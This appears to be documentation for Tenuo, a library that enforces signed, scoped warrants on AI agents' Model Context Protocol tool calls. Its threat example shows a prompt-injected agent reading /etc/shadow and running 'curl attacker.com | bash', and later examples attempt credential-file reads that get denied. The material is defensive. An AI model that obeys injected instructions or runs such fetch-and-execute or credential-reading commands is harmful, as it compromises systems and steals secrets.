## MCP Integration

Tenuo provides full Model Context Protocol (MCP) integration with cryptographic authorization, both **client-side** (protecting outgoing tool calls) and **server-side** (verifying warrants inside tool handlers).

---

## Why Tenuo for MCP?

MCP exposes powerful capabilities — filesystem, database, code execution — to AI agents. Without guardrails, a prompt-injected agent has the same access as the human who launched it.

### The Threat

```
User: "Summarize /data/reports/q1.csv"

Agent (prompt-injected mid-task):
  → read_file("/etc/shadow")        ← credential theft
  → write_file("/data/reports/q1.csv", "malicious content")
  → execute_code("curl attacker.com | bash")
```

### With Tenuo

The warrant constrains what the agent can do, regardless of what the LLM decides:

```
Warrant grants:
  read_file(path=/data/reports/*)  TTL=5min

Agent (prompt-injected):
  → read_file("/etc/shadow")
    ✗ DENIED — path not under /data/reports/

  → write_file(...)
    ✗ DENIED — tool not in warrant

  → read_file("/data/reports/q1.csv")
    ✓ AUTHORIZED — path matches, PoP valid, TTL active
```

The agent only reaches tools and arguments the warrant allows. Even if the LLM is fully compromised, the blast radius is bounded.

### OAuth vs Warrants

MCP's native auth (OAuth) answers: **WHO is calling?**
Tenuo answers: **WHAT can they do right now?**

| Aspect | OAuth Token | Tenuo Warrant |
|--------|-------------|---------------|
| **Scope granularity** | Coarse (`files:read`) | Fine (`read_file(path=/data/x/*)`) |
| **Proof-of-Possession** | Optional (DPoP) | Mandatory |
| **Delegation** | No native chaining | Cryptographic attenuation chains |
| **Verification** | Requires introspection/JWKS | Stateless, self-contained |

OAuth tells you *who* is authenticated. Warrants constrain *what* they can do *with which arguments*.

---

## Prerequisites

```bash
uv pip install "tenuo[mcp]"       # Official MCP SDK + client/server helpers (Python ≥3.10)
uv pip install "tenuo[fastmcp]"   # Adds FastMCP (for TenuoMiddleware and @mcp.tool() examples)
```

For the full LangChain + MCP example:
```bash
uv pip install "tenuo[langchain,mcp]"
```

---

## Quick Start: 5-Minute End-to-End

This walkthrough creates a protected MCP server and client, demonstrates authorization succeeding and failing, and shows the full flow.

### Step 1: Create a Protected Server

```python
# server.py
from fastmcp import FastMCP
from tenuo import Authorizer, PublicKey
from tenuo.mcp import MCPVerifier, TenuoMiddleware

import os, sys

pub_hex = os.environ.get("TENUO_ISSUER_PUB", "")
if not pub_hex:
    print("Set TENUO_ISSUER_PUB to the hex-encoded issuer public key", file=sys.stderr)
    sys.exit(1)

authorizer = Authorizer(trusted_roots=[PublicKey.from_bytes(bytes.fromhex(pub_hex))])
verifier = MCPVerifier(authorizer=authorizer, require_warrant=True)

mcp = FastMCP("demo", middleware=[TenuoMiddleware(verifier)])

@mcp.tool()
async def read_file(path: str) -> str:
    """Read a file. Tenuo verifies the warrant before this runs."""
    return open(path).read()

if __name__ == "__main__":
    mcp.run(transport="stdio")
```

### Step 2: Call It with a Warrant

```python
# client.py
import asyncio
from tenuo import SigningKey, configure, mint, Capability, Subpath
from tenuo.mcp import SecureMCPClient

key = SigningKey.generate()
configure(issuer_key=key)

# Print the public key for the server
print("TENUO_ISSUER_PUB=" + bytes(key.public_key_bytes()).hex())

async def main():
    async with SecureMCPClient(
        "python", ["server.py"],
        inject_warrant=True,
        env={"TENUO_ISSUER_PUB": bytes(key.public_key_bytes()).hex()},
    ) as client:
        # This succeeds — path is under /data/
        async with mint(Capability("read_file", path=Subpath("/data"))):
            result = await client.tools["read_file"](path="/data/hello.txt")
            print("✓", result)

        # This fails — path is outside the warrant
        async with mint(Capability("read_file", path=Subpath("/data"))):
            try:
                await client.tools["read_file"](path="/etc/shadow")
            except Exception as e:
                print("✗ DENIED:", e)

asyncio.run(main())
```

### What Happens on the Wire

```
Client                                          Server
  │                                               │
  │  1. mint(Capability("read_file", path=…))     │
  │  2. Sign PoP: sign(key, "read_file",          │
  │       {"path": "/data/hello.txt"}, now())      │
  │                                               │
  │  ─── tools/call ─────────────────────────────►│
  │  {                                            │
  │    "name": "read_file",                       │
  │    "arguments": {"path": "/data/hello.txt"},  │
  │    "_meta": {                                 │
  │      "tenuo": {                               │
  │        "warrant": "<base64>",                 │
  │        "signature": "<base64>"                │
  │      }                                        │
  │    }                                          │
  │  }                                            │
  │                                               │
  │                    3. TenuoMiddleware runs:    │
  │                       ✓ Warrant signature OK  │
  │                       ✓ Issuer ∈ trusted_roots│
  │                       ✓ PoP valid for holder  │
  │                       ✓ path ⊆ /data/         │
  │                       ✓ TTL active            │
  │                                               │
  │                    4. Tool handler executes    │
  │  ◄─── result ────────────────────────────────│
```

Tool arguments are never modified — warrant metadata travels in `params._meta.tenuo`, the MCP spec's designated extension point.

---

## Integration Patterns

### Pattern 1: FastMCP + TenuoMiddleware (Recommended for Servers)

Register `TenuoMiddleware` on your FastMCP server. Every `tools/call` is verified before the handler runs. Denied calls return `isError` results with structured diagnostics — your tool code never executes for unauthorized requests.

```python
from fastmcp import FastMCP
from tenuo import Authorizer, PublicKey, CompiledMcpConfig, McpConfig
from tenuo.mcp import MCPVerifier, TenuoMiddleware

authorizer = Authorizer(trusted_roots=[PublicKey.from_bytes(root_pub)])
config = CompiledMcpConfig.compile(McpConfig.from_file("mcp-config.yaml"))
verifier = MCPVerifier(authorizer=authorizer, config=config)

mcp = FastMCP("my-server", middleware=[TenuoMiddleware(verifier)])

@mcp.tool()
async def read_file(path: str, maxSize: int = 4096) -> str:
    """Handler only runs if warrant allows read_file with this path."""
    return open(path).read(maxSize)
```

The middleware:
- Extracts warrant + PoP from `params._meta.tenuo`
- Verifies the warrant chain, signature, constraints, and PoP
- Strips `tenuo` from `_meta` before forwarding to the handler
- Returns `-32001` (denied) or `-32002` (approval required) on failure

Install the `tenuo[fastmcp]` extra, which pins FastMCP ≥3.2.1 (includes [hardened client parsing](https://github.com/PrefectHQ/fastmcp/pull/3778) of tool error results).

### Pattern 2: SecureMCPClient (Recommended for Clients)

Tenuo's own MCP client wraps the MCP SDK with automatic warrant injection, PoP signing, and tool discovery.

```python
from tenuo.mcp import SecureMCPClient
from tenuo import configure, mint, Capability, Subpath, SigningKey

key = SigningKey.generate()
configure(issuer_key=key)

# Stdio (local subprocess)
async with SecureMCPClient("python", ["server.py"], inject_warrant=True) as client:
    async with mint(Capability("read_file", path=Subpath("/data"))):
        result = await client.tools["read_file"](path="/data/file.txt")

# SSE (remote server, legacy transport)
async with SecureMCPClient(
    url="https://mcp.example.com/sse",
    transport="sse",
    inject_warrant=True,
) as client:
    ...

# StreamableHTTP (remote server, current transport)
async with SecureMCPClient(
    url="https://mcp.example.com/mcp",
    transport="http",
    headers={"Authorization": "Bearer <token>"},
    inject_warrant=True,
) as client:
    ...
```

### Pattern 3: MCPVerifier (Framework-Agnostic Server)

Use `MCPVerifier` directly when you're not using FastMCP — works with the raw MCP SDK or any custom server.

```python
from tenuo import Authorizer, PublicKey, CompiledMcpConfig, McpConfig
from tenuo.mcp import MCPVerifier

authorizer = Authorizer(trusted_roots=[PublicKey.from_bytes(root_pub)])
config = CompiledMcpConfig.compile(McpConfig.from_file("mcp-config.yaml"))
verifier = MCPVerifier(authorizer=authorizer, config=config)

# In your tool handler:
result = verifier.verify("read_file", {"path": path}, meta=request_meta)
result.raise_if_denied()
execute_tool(result.clean_arguments)

# Or use verify_or_raise for a one-liner:
clean = verifier.verify_or_raise("read_file", {"path": path}, meta=request_meta)
```

### Pattern 4: Securing LangChain MCP Adapters

If you're already using `langchain-mcp-adapters`, wrap its tools with `guard_tools()`:

```python
from langchain_mcp_adapters.client import MultiServerMCPClient
from tenuo.langchain import guard_tools

async with MultiServerMCPClient({
    "fs": {"transport": "stdio", "command": "python", "args": ["server.py"]}
}) as client:
    mcp_tools = await client.get_tools()
    secure_tools = guard_tools(mcp_tools)
    # Use secure_tools in your LangChain agent
```

> **Note**: `SecureMCPClient` is Tenuo's own MCP client (Pattern 2).
> It is _not_ interchangeable with LangChain's `MultiServerMCPClient`.
> Use `guard_tools()` to protect LangChain adapter tools.

---

## Approval Gates

Warrants can embed **approval gates** that require human approval before a tool call proceeds. When a gate triggers, the server returns a structured error so clients can collect approvals and retry.

### How It Works

```
Client                              Server
  │  call_tool("transfer", ...)       │
  │──────────────────────────────────►│
  │                                   │ Warrant has approval gate
  │  ◄── -32002 + request_hash ──────│ for transfer > $10,000
  │                                   │
  │  collect_human_approval(...)      │
  │                                   │
  │  call_tool("transfer", ...,       │
  │    approvals=[signed_approval])   │
  │──────────────────────────────────►│
  │                                   │ ✓ Approval valid
  │  ◄── result ─────────────────────│ Transfer completes
```

### Server-Side

With `TenuoMiddleware`, approval gates work automatically. The middleware returns `-32002` with `request_hash` in `structuredContent.tenuo`. Without middleware:

```python
result = verifier.verify("transfer", arguments, meta=meta)
if result.is_approval_required:
    return {"jsonrpc": "2.0", "id": req_id, "error": result.to_jsonrpc_error()}

result.raise_if_denied()
execute_tool(result.clean_arguments)
```

### Client-Side

`SecureMCPClient` raises `MCPApprovalRequired` when the server returns `-32002`:

```python
from tenuo.mcp import MCPApprovalRequired

try:
    result = await client.call_tool("transfer", {"amount": 5000, "recipient": "acme"})
except MCPApprovalRequired as e:
    approval = collect_human_approval(e)  # app-specific UI flow
    result = await client.call_tool(
        "transfer",
        {"amount": 5000, "recipient": "acme"},
        approvals=[approval],
    )
```

### JSON-RPC Error Codes

| Code | Meaning | Action |
|------|---------|--------|
| `-32602` | Invalid params (missing required extraction field) | Fix arguments |
| `-32001` | Access denied (constraint violation, expired, bad signature) | Request new warrant |
| `-32002` | Approval required (approval gate triggered) | Collect approvals and re-submit |

---

## MCP Configuration

Define how to extract constraints from MCP tool call arguments.

> This configuration defines **extraction**, not **policy**. It tells Tenuo where to find the arguments in the JSON-RPC call. The actual limits (which paths are allowed, what ranges are valid) are defined in the Warrant. See [Argument Extraction](./constraints#argument-extraction) for a deep dive.

### Extraction Sources

MCP tool calls provide an `arguments` JSON object. Use:

- **`from: body`** - Extract from arguments (recommended)
- **`from: literal`** - Use default value

**Don't use**: `from: path`, `from: query`, `from: header` (HTTP-only)

### Example Configuration

```yaml
# mcp-config.yaml
version: "1"

tools:
  read_file:
    description: "Read files from the filesystem"
    constraints:
      path:
        from: body
        path: "path"
        required: true
      max_size:
        from: body
        path: "maxSize"
        type: integer
        default: 1048576

  database_query:
    description: "Execute database queries"
    constraints:
      table:
        from: body
        path: "query.table"
        required: true
      operation:
        from: body
        path: "query.operation"
        required: true
        allowed_values: ["select", "insert", "update", "delete"]
      row_limit:
        from: body
        path: "query.limit"
        type: integer
        default: 100
```

### Automatic Extraction

When using `SecureMCPClient(config_path="...", register_config=True)`, extraction happens automatically during tool calls.

### Manual Extraction

If not using `SecureMCPClient`, extract constraints yourself:

```python
compiled = CompiledMcpConfig.compile(McpConfig.from_file("mcp-config.yaml"))
result = compiled.extract_constraints("read_file", arguments)
# result.constraints: {"path": "/var/log/app.log", "max_size": 524288}
```

### Nested Paths and Wildcards

```yaml
constraints:
  table:
    from: body
    path: "query.table"       # Extracts arguments.query.table

  item_ids:
    from: body
    path: "items.*.id"        # Extracts all item IDs (returns list)
```

Wildcard extraction returns a list. Use compatible constraints: `OneOf`, `NotOneOf`, or `CEL`.

---

## Warrant Propagation

To enable end-to-end authorization where the server verifies the warrant, set `inject_warrant=True`:

```python
async with SecureMCPClient(..., inject_warrant=True) as client:
    await client.tools["read_file"](path="/tmp/test.txt")
```

Tenuo sends warrant metadata via `params._meta.tenuo`:

```json
{
  "name": "read_file",
  "arguments": {"path": "/data/file.txt"},
  "_meta": {
    "tenuo": {
      "warrant": "<base64>",
      "signature": "<base64>",
      "approvals": ["<base64>", ...]
    }
  }
}
```

The `warrant` field accepts either a single base64-encoded warrant (for root warrants issued directly by a trusted root) or a **WarrantStack** — the full delegation chain encoded as a CBOR array. See [Multi-Agent Delegation](#multi-agent-delegation) below.

---

## Security Best Practices

### 1. Use Short TTLs

MCP tools are often high-risk (filesystem, database). Use short TTLs:

```python
warrant = (Warrant.mint_builder()
    .capability("read_file", path=Subpath("/var/log"))
    .holder(key.public_key)
    .ttl(300)  # 5 minutes
    .mint(key))
```

### 2. Narrow Constraints

```python
# Too broad — agent can read anything
constraints = {"path": Wildcard()}

# Specific — agent can only read under /var/log
constraints = {"path": Subpath("/var/log")}
```

### 3. Validate Configuration

```python
compiled = CompiledMcpConfig.compile(config)
warnings = compiled.validate()
for warning in warnings:
    print(warning)
```

### 4. Payload Size Limits (DoS Prevention)

`MCPVerifier` enforces size limits on incoming `_meta.tenuo` payloads before decoding:

| Field | Limit |
|-------|-------|
| `warrant` (base64) | 64 KB |
| `signature` (base64) | 4 KB |
| Each `approvals[]` entry | 8 KB |
| `approvals` count | 64 |

Oversized payloads are rejected with `-32602` (invalid params). Override the module-level constants in `tenuo.mcp.server` if needed.

---

## Error Handling

MCP integration uses typed `TenuoError` exceptions with canonical wire codes:

```python
from tenuo.exceptions import (
    TenuoError,
    ToolNotAuthorized,
    ConstraintViolation,
    ConfigurationError,
)

try:
    result = await client.call_tool("read_file", {"path": "/etc/passwd"})
except ConstraintViolation as e:
    print(f"Constraint failed: {e}")
    print(f"Wire code: {e.get_wire_code()}")  # 1501
except ConfigurationError as e:
    print(f"Config error: {e}")
except TenuoError as e:
    print(f"Authorization failed: {e.to_dict()}")
```

### Common Errors

| Error | Wire Code | Cause | Fix |
|-------|-----------|-------|-----|
| `ToolNotAuthorized` | 1500 | Tool not in warrant | Add tool to warrant |
| `ConstraintViolation` | 1501 | Argument violates constraint | Request within bounds |
| `ConfigurationError` | 1201 | Not connected / extraction failed | Use `async with` or check config |
| `ExpiredError` | 1300 | TTL exceeded | Request fresh warrant |

See [wire format specification](./spec/wire-format-v1#appendix-a-error-codes) for the complete list.

---

## Troubleshooting

### Extraction Errors

**Problem**: `ExtractionError: field 'path' not found`

**Solution**: Check MCP arguments match config:

```python
# Config expects:
path: "path"

# MCP call must have:
arguments = {"path": "/var/log/app.log"}
```

### Authorization Denied

**Problem**: `AuthorizationDenied: path is not contained in allowed directory`

**Solution**: Check warrant constraints match extracted values:

```python
# Warrant allows:
constraints = {"path": Subpath("/var/log")}

# MCP call sends:
arguments = {"path": "/etc/passwd"}  # Not under /var/log — denied

# Fix: narrow the call or broaden the warrant
```

### Type Mismatches

**Problem**: `TypeError: expected integer, got string`

**Solution**: Specify type in config:

```yaml
max_size:
  from: body
  path: "maxSize"
  type: integer  # ← Add this
```

---

## Advanced: Multi-Agent Delegation

Delegation produces a **chain** of warrants — each child is cryptographically linked to its parent via `parent_hash = SHA-256(parent.payload)`. The child can only **narrow** the parent's scope (tools, constraints, TTL), never widen it; Rust enforces this at creation time.

```python
from tenuo import (
    SigningKey, Warrant, Subpath, Authorizer,
    encode_warrant_stack, decode_warrant_stack_base64,
)

control_key      = SigningKey.generate()  # issuer / control plane
orchestrator_key = SigningKey.generate()  # orchestrator agent
worker_key       = SigningKey.generate()  # worker agent

# 1. Control plane mints root warrant for orchestrator
root_warrant = (Warrant.mint_builder()
    .capability("read_file", path=Subpath("/data"))
    .capability("database_query", table=Subpath("/data"))
    .holder(orchestrator_key.public_key)
    .ttl(3600)
    .mint(control_key))

# 2. Orchestrator attenuates for worker (read-only, narrower path)
worker_warrant = (root_warrant.grant_builder()
    .capability("read_file", path=Subpath("/data/reports"))
    .holder(worker_key.public_key)
    .ttl(1800)
    .grant(orchestrator_key))  # orchestrator signs (proves they hold parent)

# 3. Worker sends the full chain as a WarrantStack
chain = [root_warrant, worker_warrant]
stack_b64 = encode_warrant_stack(chain)  # single base64 blob

# 4. Server verifies the full chain
authorizer = Authorizer(trusted_roots=[control_key.public_key])
decoded = decode_warrant_stack_base64(stack_b64)

import time
pop = worker_warrant.sign(worker_key, "read_file",
                          {"path": "/data/reports/q1.csv"}, int(time.time()))
authorizer.check_chain(
    decoded, "read_file", {"path": "/data/reports/q1.csv"},
    signature=bytes(pop),
)
# ✓ root.issuer ∈ trusted_roots
# ✓ worker.issuer == root.holder (delegation authority)
# ✓ worker.parent_hash == SHA-256(root.payload)
# ✓ worker capabilities ⊆ root capabilities
# ✓ PoP valid for worker_key
```

On the wire, the worker sends `stack_b64` in `_meta.tenuo.warrant`. `Authorizer.check_chain` verifies the entire path from root to leaf in one call.

> **Important:** An orphaned child warrant (sent without its parent chain) will be rejected — the server cannot verify the delegation path. Always send the full `WarrantStack` containing every warrant from root to leaf.

**Client-side with `chain_scope`:** When using `SecureMCPClient` with `inject_warrant=True`, set the parent chain via `chain_scope` so the client encodes the full `WarrantStack` automatically:

```python
from tenuo import chain_scope, warrant_scope, key_scope

with chain_scope([root_warrant]):
    with warrant_scope(worker_warrant):
        with key_scope(worker_key):
            result = await client.tools["read_file"](path="/data/reports/q1.csv")
```

---

## Advanced: Manual Authorization

For fine-grained control or Python < 3.10, you can manually define constraints and authorize calls without `SecureMCPClient` or `MCPVerifier`.

```python
from tenuo import McpConfig, CompiledMcpConfig, Authorizer, SigningKey, Warrant, Subpath, Range

# 1. Load MCP configuration
config = McpConfig.from_file("mcp-config.yaml")
compiled = CompiledMcpConfig.compile(config)

# 2. Create warrant
control_key = SigningKey.generate()
warrant = (Warrant.mint_builder()
    .capability("read_file",
        path=Subpath("/var/log"),
        max_size=Range.max_value(1024 * 1024))
    .holder(control_key.public_key)
    .ttl(3600)
    .mint(control_key))

# 3. Handle MCP tool call
mcp_arguments = {"path": "/var/log/app.log", "maxSize": 512 * 1024}

# 4. Extract constraints based on config
result = compiled.extract_constraints("read_file", mcp_arguments)

# 5. Authorize with PoP signature
import time

pop_sig = warrant.sign(control_key, "read_file", dict(result.constraints), int(time.time()))
authorizer = Authorizer(trusted_roots=[control_key.public_key])
authorizer.authorize_one(warrant, "read_file", dict(result.constraints), signature=bytes(pop_sig))
```

---

## Scope & Boundaries

### Tenuo Provides
- **Secure Client** (`SecureMCPClient`): Wraps the MCP SDK with warrant injection and constraint enforcement. Supports stdio, SSE, and StreamableHTTP transports.
- **Server Middleware** (`TenuoMiddleware`): Drop-in FastMCP middleware that verifies every `tools/call` and returns structured denials.
- **Server Verification** (`MCPVerifier`): Framework-agnostic warrant verification for MCP server tool handlers. Works with FastMCP, the raw MCP SDK, or any custom server.
- **Tool discovery**: Automatic wrapping of discovered tools with enforcement wrappers.
- **Warrant propagation**: Injecting warrants (+ approvals) into `params._meta` for end-to-end verification.
- **Constraint extraction**: Config-driven extraction from MCP arguments.
- **Approval gate flow**: Structured JSON-RPC errors (`-32002`) for approval-gate-protected tools with retry support.

### Tenuo Does NOT Provide
- MCP Server Framework: Use [`fastmcp`](https://github.com/jlowin/fastmcp) or the official SDK to build servers. Tenuo's `MCPVerifier` plugs into any framework.
- MCP Transport: Tenuo relies on standard transports (stdio, SSE, StreamableHTTP).
- Prompt Injection Detection: Tenuo assumes injection will happen. Instead of detecting it, Tenuo fails closed on unauthorized actions — a successful injection can still influence agent reasoning, but cannot invoke tools outside the warrant's scope.

---

## Reference: Common Tool Configurations

### Filesystem

```yaml
read_file:
  constraints:
    path:
      from: body
      path: "path"
      required: true
    max_size:
      from: body
      path: "maxSize"
      type: integer
      default: 1048576

write_file:
  constraints:
    path:
      from: body
      path: "path"
      required: true
    content:
      from: body
      path: "content"
      required: true
```

### Database

```yaml
database_query:
  constraints:
    table:
      from: body
      path: "query.table"
      required: true
    operation:
      from: body
      path: "query.operation"
      required: true
      allowed_values: ["select", "insert", "update", "delete"]
    row_limit:
      from: body
      path: "query.limit"
      type: integer
      default: 100
```

### Code Execution

```yaml
execute_code:
  constraints:
    language:
      from: body
      path: "code.language"
      required: true
      allowed_values: ["python", "javascript", "bash"]
    timeout:
      from: body
      path: "code.timeout"
      type: integer
      default: 30
```

### HTTP Requests

```yaml
http_request:
  constraints:
    url:
      from: body
      path: "request.url"
      required: true
    method:
      from: body
      path: "request.method"
      required: true
      allowed_values: ["GET", "POST", "PUT", "DELETE"]
```

---

## Examples

- [`tenuo-python/examples/mcp_server.py`](https://github.com/tenuo-ai/tenuo/blob/main/tenuo-python/examples/mcp_server.py): Server patterns (middleware, raw mode, approval gates, mixed deployment)
- [`tenuo-python/examples/mcp_client.py`](https://github.com/tenuo-ai/tenuo/blob/main/tenuo-python/examples/mcp_client.py): Multi-transport client patterns
- [`tenuo-python/examples/mcp/`](https://github.com/tenuo-ai/tenuo/tree/main/tenuo-python/examples/mcp): LangChain, CrewAI, A2A, delegation demos

---

## See Also

- [API Reference → MCP Integration](./api-reference#mcp)
- [Argument Extraction](./constraints#argument-extraction)
- [Constraints Guide](./constraints)
- [Security Best Practices](./security)
- [Wire Format Specification](./spec/wire-format-v1)
